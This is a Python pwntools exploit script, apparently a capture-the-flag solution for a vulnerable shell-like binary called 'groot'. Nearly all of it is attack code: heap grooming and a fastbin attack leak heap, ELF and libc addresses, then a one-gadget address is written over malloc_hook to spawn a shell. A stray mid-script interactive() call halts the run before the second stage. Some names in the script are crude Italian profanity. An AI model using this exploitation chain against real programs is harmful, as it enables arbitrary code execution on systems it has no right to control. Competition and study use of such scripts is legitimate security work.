from pwn import *

#context.log_level = 'debug' 
STDOUT_OFFSET = 0x204020
ELF_OFFSET = 0x204040
ELF_POSITION = 0x11eb8
STCK_OFFSET = 0x134c80
MALLOC_HOOK_OFFSET = 0x3ebc30
FREE_HOOK_OFFSET = 0x3ed8e8
MAGIC = 0x10a38c
env_vars = {'LD_LIBRARY_PATH':'.'}

def createFile(conn, file_name, content):
    conn.recvuntil('$')
    conn.sendline('mkfile ' + file_name)
    conn.recvuntil('Content?')
    conn.send(content)

def makeDir(conn, dir_name):
    conn.recvuntil('$')
    conn.sendline('mkdir ' + dir_name)

def cdDir(conn, dir_path):
    conn.recvuntil('$')
    conn.sendline('cd ' + dir_path)

def rmFile(conn, file_name):
    conn.recvuntil('$')
    conn.sendline('rm ' + file_name)

def mvFile(conn, old, new):
    conn.recvuntil('$')
    conn.sendline('mv ' + old + ' ' + new)

def ls(conn, path=''):
    conn.recvuntil('$')
    conn.sendline('ls ' + path)
    return conn.recvuntil('\n\n')

def touch(conn, file_name):
    conn.recvuntil('$')
    conn.sendline('touch ' + file_name)

conn = process('./groot_patched', env=env_vars, aslr=False)
#conn = remote('54.238.202.201', 31733)
makeDir     (conn, 'directory1')
cdDir       (conn, 'directory1')
createFile  (conn, 'file1', 'AAAA')
createFile  (conn, 'file2', 'BBBB')
createFile  (conn, 'file3', 'CCCC')
cdDir       (conn, '..')
rmFile      (conn, 'directory1')
makeDir     (conn, 'directory1')
leak = ls   (conn, 'directory1')
leak = leak.split('\x1b\x5b\x30\x6d\x09')[2]
leak = leak.ljust(8, '\x00')
heap_base = u64(leak) - 0x12d20
print 'Heap base: ' + hex(heap_base)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, '..')
conn.interactive()


### Workspace should be clear now
### Now i want to performa a fastbin attack to leak the elf position
cdDir       (conn, '..')
makeDir     (conn, 'groot2')
cdDir       (conn, 'groot2')
cdDir       (conn, 'AAAA')
# PTRS
createFile  (conn, 'file1', 'AAAA')
createFile  (conn, 'file2', 'BBBB')
createFile  (conn, 'file3', 'CCCC')
createFile  (conn, 'file4', 'DDDD')
createFile  (conn, 'file5', p64(heap_base + 0x13420)) # This points to the first directory after the elf leak
createFile  (conn, 'file6', p64(heap_base + 0x12ea0)) # This points to the second directory
createFile  (conn, 'file7', 'GGGG')
createFile  (conn, 'file8', 'HHHH')
createFile  (conn, 'file9', 'IIII')
createFile  (conn, 'file10', 'LLLL')
makeDir     (conn, 'DIOSCHIFO')
cdDir       (conn, 'DIOSCHIFO')
createFile  (conn, 'DIOPORCO', 'DIOPORCO')
cdDir       (conn, '..')
rmFile      (conn, 'file1')
rmFile      (conn, 'DIOSCHIFO')
rmFile      (conn, 'file2')
rmFile      (conn, 'file3')
rmFile      (conn, 'file4')
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'A' * 0x30)
### FILLING FILE BLOCKS
makeDir     (conn, p64(heap_base + 0x13060))
cdDir       (conn, p64(heap_base + 0x13060))
leak = ls   (conn)
leak = leak.split('\x1b\x5b\x30\x6d\x09')[1]
mvFile      (conn, leak, 'new_fileaaaaaaaaaaaaaaaaaaaaaaaaaa')
cdDir       (conn, p64(heap_base + 0x13380))
cdDir       (conn, p64(heap_base + 0x13380))
cdDir       (conn, p64(heap_base + 0x13380))
cdDir       (conn, '..')
cdDir       (conn, p64(heap_base + ELF_POSITION)) # ATTACK [Location where there's a leak of elf]
leak = ls   (conn, '')
leak = leak.split('\x1b\x5b\x33\x38\x3b\x35\x3b\x31\x35\x33\x6d')[2]
leak = leak.split('\x1b\x5b\x30\x6d\x09')[0]
leak = leak.ljust(8, '\x00')
elf_base = u64(leak) - ELF_OFFSET
print 'ELF base: ' + hex(elf_base)
makeDir     (conn, p64(heap_base + 0x130e0))
cdDir       (conn, p64(elf_base + 0x203f70))
cdDir       (conn, p64(elf_base + 0x203f70))
leak = ls   (conn, '')
leak = leak.split('\x1b\x5b\x33\x38\x3b\x35\x3b\x31\x35\x33\x6d')[2]
leak = leak.split('\x1b\x5b\x30\x6d\x09')[0]
leak = leak.ljust(8, '\x00')
libc_base = u64(leak) - STCK_OFFSET
print 'libc base: ' + hex(libc_base)
print 'hook: ' + hex(libc_base + MALLOC_HOOK_OFFSET)
print 'debug at: ' + hex(heap_base + 0x12ea0)
makeDir     (conn, p64(libc_base + MALLOC_HOOK_OFFSET))
cdDir       (conn, p64(libc_base + MAGIC))
cdDir       (conn, p64(libc_base + MAGIC))
cdDir       (conn, p64(libc_base + MAGIC))
cdDir       (conn, p64(libc_base + MAGIC))
createFile  (conn, "I AM GROOT!!!")
conn.interactive()



